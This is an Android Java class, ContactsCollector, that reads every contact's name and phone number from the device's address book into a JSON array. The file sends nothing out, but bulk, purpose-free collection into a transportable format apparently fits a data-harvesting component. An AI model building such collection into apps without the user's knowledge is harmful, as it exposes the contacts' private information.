package com.alzahra.data;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import org.json.JSONArray;
import org.json.JSONObject;

public class ContactsCollector {
    private Context context;

    public ContactsCollector(Context ctx) {
        this.context = ctx;
    }

    public JSONArray collectContacts() {
        JSONArray contacts = new JSONArray();
        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        
        if (cursor != null) {
            int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
            int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            
            while (cursor.moveToNext()) {
                try {
                    JSONObject contact = new JSONObject();
                    contact.put("name", cursor.getString(nameIndex));
                    contact.put("phone", cursor.getString(numberIndex));
                    contacts.put(contact);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            cursor.close();
        }
        return contacts;
    }
}
